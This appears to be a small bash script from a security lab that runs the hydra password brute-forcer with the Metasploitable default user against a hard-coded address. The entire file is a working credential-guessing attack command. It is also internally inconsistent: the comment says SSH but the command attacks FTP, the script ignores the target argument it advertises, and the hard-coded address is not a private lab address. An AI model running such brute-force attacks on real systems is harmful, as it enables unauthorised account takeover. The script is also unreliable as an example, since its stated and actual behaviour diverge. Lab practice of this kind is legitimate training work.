#!/bin/bash
# vm_lab/attack_scripts/brute_force.sh
# SSH brute-force simulation using hydra against Metasploitable.
# Usage: ./brute_force.sh <TARGET_IP>

hydra -l msfadmin -P pass.txt ftp://191.168.232.130 -t 6 -V